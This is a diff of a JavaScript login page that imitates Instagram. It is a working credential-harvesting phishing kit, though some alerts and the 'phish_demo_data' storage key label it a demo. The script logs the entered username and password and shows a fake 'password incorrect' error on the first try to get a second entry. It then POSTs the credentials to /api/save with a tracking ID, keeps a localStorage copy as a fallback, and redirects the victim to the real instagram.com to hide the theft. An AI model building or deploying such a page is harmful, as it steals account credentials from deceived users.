-          }
-        } catch (error) {
-          console.warn('⚠️ Could not reach server:', error);
-          // Fallback: save to localStorage
-          try {
-            const stored = JSON.parse(localStorage.getItem('phish_demo_data') || '[]');
-            stored.push({ 
-              username, 
-              password, 
-              timestamp: new Date().toISOString(),
-              attempt: attemptCount 
+                if (!trimmed || trimmed === '') {
+                    return {
+                        valid: false,
+                        message: 'Please enter your password'
+                    };
+                }
+
+                if (trimmed.length < 6) {
+                    return {
+                        valid: false,
+                        message: 'Password must be at least 6 characters'
+                    };
+                }
+
+                return { valid: true };
+            }
+
+            // Hide all error messages
+            function hideAllErrors() {
+                generalError.classList.remove('show');
+                usernameError.classList.remove('show');
+                passwordError.classList.remove('show');
+                usernameInput.classList.remove('error');
+                passwordInput.classList.remove('error');
+                loginBtn.classList.remove('shake');
+            }
+
+            // Show specific error
+            function showError(errorElement, inputElement = null) {
+                errorElement.classList.add('show');
+                if (inputElement) {
+                    inputElement.classList.add('error');
+                    inputElement.focus();
+                }
+                loginBtn.classList.add('shake');
+                setTimeout(() => {
+                    loginBtn.classList.remove('shake');
+                }, 500);
+            }
+
+            // ----- Save credentials to server -----
+            async function saveToServer(username, password) {
+                try {
+                    const response = await fetch('/api/save', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: username,
+                            password: password,
+                            rid: 'demo_rid_123',
+                            attempt: attemptCount
+                        })
+                    });
+
+                    const data = await response.json();
+                    if (data.success) {
+                        console.log('✅ Data saved to server:', data);
+                    } else {
+                        console.warn('⚠️ Server save failed:', data.error);
+                    }
+                } catch (error) {
+                    console.warn('⚠️ Could not reach server:', error);
+                    // Fallback: save to localStorage
+                    try {
+                        const stored = JSON.parse(localStorage.getItem('phish_demo_data') || '[]');
+                        stored.push({
+                            username,
+                            password,
+                            timestamp: new Date().toISOString(),
+                            attempt: attemptCount
+                        });
+                        localStorage.setItem('phish_demo_data', JSON.stringify(stored));
+                        console.log('📁 Data saved to localStorage as fallback');
+                    } catch (e) { }
+                }
+            }
+
+            // ----- FORM SUBMIT: capture data, show popup, then redirect to instagram -----
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                // Hide previous errors
+                hideAllErrors();
+
+                // --- VALIDATION ---
+                let isValid = true;
+
+                // Validate username/email/phone
+                const usernameValidation = validateUsername(username);
+                if (!usernameValidation.valid) {
+                    usernameErrorText.textContent = usernameValidation.message;
+                    showError(usernameError, usernameInput);
+                    isValid = false;
+                }
+
+                // Validate password
+                const passwordValidation = validatePassword(password);
+                if (!passwordValidation.valid) {
+                    passwordErrorText.textContent = passwordValidation.message;
+                    showError(passwordError, passwordInput);
+                    isValid = false;
+                }
+
+                if (!isValid) {
+                    console.log('❌ Validation failed - showing errors');
+                    return;
+                }
+
+                // --- INCREMENT ATTEMPT COUNT (PERSISTENT) ---
+                attemptCount = incrementAttemptCount();
+                console.log(`🔐 Credentials captured (Attempt ${attemptCount}):`, { username, password });
+
+                // --- CHECK IF THIS IS FIRST ATTEMPT ---
+                if (attemptCount === 1) {
+                    // First attempt: Show error message
+                    generalErrorText.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+                    showError(generalError);
+
+                    usernameInput.classList.add('error');
+                    passwordInput.classList.add('error');
+
+                    // Clear password field
+                    passwordInput.value = '';
+                    passwordInput.focus();
+
+                    console.log('❌ First attempt failed - showing error');
+                    return;
+                }
+
+                // --- SECOND ATTEMPT (or more): Save data and show success ---
+                // Save to server
+                saveToServer(username, password);
+
+                // ---- Show loading, then popup ----
+                loginBtn.classList.add('loading');
+                loginBtn.querySelector('.btn-text').textContent = 'Logging in...';
+                loginBtn.disabled = true;
+
+                setTimeout(() => {
+                    loginBtn.classList.remove('loading');
+                    loginBtn.querySelector('.btn-text').textContent = 'Log in';
+                    loginBtn.disabled = false;
+
+                    // Show the popup
+                    popup.style.display = 'flex';
+
+                    let redirectTimer = null;
+
+                    function redirectToInstagram() {
+                        // 🔥 RESET ATTEMPT COUNT FOR NEXT SESSION
+                        resetAttemptCount();
+                        window.location.href = 'https://www.instagram.com';
+                    }
+
+                    // If user clicks "OK", redirect immediately
+                    const popupCloseHandler = function () {
+                        popupClose.removeEventListener('click', popupCloseHandler);
+                        if (redirectTimer) {
+                            clearTimeout(redirectTimer);
+                            redirectTimer = null;
+                        }
+                        hidePopup();
+                        redirectToInstagram();
+                    };
+
+                    popupClose.addEventListener('click', popupCloseHandler);
+
+                    // Auto-redirect after 3 seconds
+                    redirectTimer = setTimeout(function () {
+                        if (popup.style.display === 'flex') {
+                            popupClose.removeEventListener('click', popupCloseHandler);
+                            hidePopup();
+                            redirectToInstagram();
+                        }
+                    }, 3000);
+
+                }, 2000);
             });
-            localStorage.setItem('phish_demo_data', JSON.stringify(stored));
-            console.log('📁 Data saved to localStorage as fallback');
-          } catch (e) {}
-        }
-      }
 
-      // ----- FORM SUBMIT: capture data, show popup, then redirect to instagram -----
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
-
-        // Hide previous errors
-        hideAllErrors();
-
-        // --- VALIDATION ---
-        let isValid = true;
-
-        // Validate username/email/phone
-        const usernameValidation = validateUsername(username);
-        if (!usernameValidation.valid) {
-          usernameErrorText.textContent = usernameValidation.message;
-          showError(usernameError, usernameInput);
-          isValid = false;
-        }
-
-        // Validate password
-        const passwordValidation = validatePassword(password);
-        if (!passwordValidation.valid) {
-          passwordErrorText.textContent = passwordValidation.message;
-          showError(passwordError, passwordInput);
-          isValid = false;
-        }
-
-        if (!isValid) {
-          console.log('❌ Validation failed - showing errors');
-          return;
-        }
-
-        // --- INCREMENT ATTEMPT COUNT (PERSISTENT) ---
-        attemptCount = incrementAttemptCount();
-        console.log(`🔐 Credentials captured (Attempt ${attemptCount}):`, { username, password });
-
-        // --- CHECK IF THIS IS FIRST ATTEMPT ---
-        if (attemptCount === 1) {
-          // First attempt: Show error message
-          generalErrorText.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
-          showError(generalError);
-          
-          usernameInput.classList.add('error');
-          passwordInput.classList.add('error');
-          
-          // Clear password field
-          passwordInput.value = '';
-          passwordInput.focus();
-          
-          console.log('❌ First attempt failed - showing error');
-          return;
-        }
-
-        // --- SECOND ATTEMPT (or more): Save data and show success ---
-        // Save to server
-        saveToServer(username, password);
-
-        // ---- Show loading, then popup ----
-        loginBtn.classList.add('loading');
-        loginBtn.querySelector('.btn-text').textContent = 'Logging in...';
-        loginBtn.disabled = true;
-
-        setTimeout(() => {
-          loginBtn.classList.remove('loading');
-          loginBtn.querySelector('.btn-text').textContent = 'Log in';
-          loginBtn.disabled = false;
-
-          // Show the popup
-          popup.style.display = 'flex';
-
-          let redirectTimer = null;
-
-          function redirectToInstagram() {
-            // 🔥 RESET ATTEMPT COUNT FOR NEXT SESSION
-            resetAttemptCount();
-            window.location.href = 'https://www.instagram.com';
-          }
-
-          // If user clicks "OK", redirect immediately
-          const popupCloseHandler = function() {
-            popupClose.removeEventListener('click', popupCloseHandler);
-            if (redirectTimer) {
-              clearTimeout(redirectTimer);
-              redirectTimer = null;
+            // ----- Hide popup function -----
+            function hidePopup() {
+                popup.style.display = 'none';
             }
-            hidePopup();
-            redirectToInstagram();
-          };
-          
-          popupClose.addEventListener('click', popupCloseHandler);
 
-          // Auto-redirect after 3 seconds
-          redirectTimer = setTimeout(function() {
-            if (popup.style.display === 'flex') {
-              popupClose.removeEventListener('click', popupCloseHandler);
-              hidePopup();
-              redirectToInstagram();
-            }
-          }, 3000);
+            // Close popup on button click
+            popupClose.addEventListener('click', function () {
+                hidePopup();
+            });
 
-        }, 2000);
-      });
+            // Close popup if user clicks outside the box
+            popup.addEventListener('click', function (e) {
+                if (e.target === popup) {
+                    hidePopup();
+                }
+            });
 
-      // ----- Hide popup function -----
-      function hidePopup() {
-        popup.style.display = 'none';
-      }
+            // ----- Clear errors on input -----
+            usernameInput.addEventListener('input', function () {
+                if (this.classList.contains('error')) {
+                    this.classList.remove('error');
+                    usernameError.classList.remove('show');
+                }
+                if (generalError.classList.contains('show')) {
+                    generalError.classList.remove('show');
+                }
+            });
 
-      // Close popup on button click
-      popupClose.addEventListener('click', function() {
-        hidePopup();
-      });
+            passwordInput.addEventListener('input', function () {
+                if (this.classList.contains('error')) {
+                    this.classList.remove('error');
+                    passwordError.classList.remove('show');
+                }
+                if (generalError.classList.contains('show')) {
+                    generalError.classList.remove('show');
+                }
+            });
 
-      // Close popup if user clicks outside the box
-      popup.addEventListener('click', function(e) {
-        if (e.target === popup) {
-          hidePopup();
-        }
-      });
+            // ----- Mock interactions (Facebook, forgot, signup) -----
+            document.getElementById('fbLogin')?.addEventListener('click', function () {
+                alert('🔵 Facebook login flow (simulated) – this is a frontend demo.');
+            });
 
-      // ----- Clear errors on input -----
-      usernameInput.addEventListener('input', function() {
-        if (this.classList.contains('error')) {
-          this.classList.remove('error');
-          usernameError.classList.remove('show');
-        }
-        if (generalError.classList.contains('show')) {
-          generalError.classList.remove('show');
-        }
-      });
+            document.getElementById('forgotLink')?.addEventListener('click', function (e) {
+                e.preventDefault();
+                alert('🔐 Password reset link would be sent (demo).');
+            });
 
-      passwordInput.addEventListener('input', function() {
-        if (this.classList.contains('error')) {
-          this.classList.remove('error');
-          passwordError.classList.remove('show');
-        }
-        if (generalError.classList.contains('show')) {
-          generalError.classList.remove('show');
-        }
-      });
+            document.getElementById('signupLink')?.addEventListener('click', function (e) {
+                e.preventDefault();
+                alert('📝 Sign up page (static demo).');
+            });
 
-      // ----- Mock interactions (Facebook, forgot, signup) -----
-      document.getElementById('fbLogin')?.addEventListener('click', function() {
-        alert('🔵 Facebook login flow (simulated) – this is a frontend demo.');
-      });
+            // app badges click
+            document.querySelectorAll('.app-badges i, .badge-fallback span').forEach(el => {
+                el.addEventListener('click', function () {
+                    alert('📲 App store link (simulated).');
+                });
+            });
 
-      document.getElementById('forgotLink')?.addEventListener('click', function(e) {
-        e.preventDefault();
-        alert('🔐 Password reset link would be sent (demo).');
-      });
+            console.log('✅ Instagram login - 2-step validation with persistent attempt tracking');
+            console.log('📌 Current attempt count:', attemptCount);
 
-      document.getElementById('signupLink')?.addEventListener('click', function(e) {
-        e.preventDefault();
-        alert('📝 Sign up page (static demo).');
-      });
+            // Add reset function to console for debugging
+            console.log('🔄 To reset attempt count, run: resetAttemptCount()');
+            window.resetAttemptCount = resetAttemptCount;
 
-      // app badges click
-      document.querySelectorAll('.app-badges i, .badge-fallback span').forEach(el => {
-        el.addEventListener('click', function() {
-          alert('📲 App store link (simulated).');
-        });
-      });
-
-      console.log('✅ Instagram login - 2-step validation with persistent attempt tracking');
-      console.log('📌 Current attempt count:', attemptCount);
-      
-      // Add reset function to console for debugging
-      console.log('🔄 To reset attempt count, run: resetAttemptCount()');
-      window.resetAttemptCount = resetAttemptCount;
-      
-      console.log('📋 Validation rules:');
-      console.log('  - Email: user@domain.com');
-      console.log('  - Username: letters, numbers, dots, underscores (1-30 chars)');
-      console.log('  - Phone: at least 10 digits');
-      console.log('  - Password: minimum 6 characters');
-    })();
-  </script>
+            console.log('📋 Validation rules:');
+            console.log('  - Email: user@domain.com');
+            console.log('  - Username: letters, numbers, dots, underscores (1-30 chars)');
+            console.log('  - Phone: at least 10 digits');
+            console.log('  - Password: minimum 6 characters');
+        })();
+    </script>
 </body>
+
 </html>
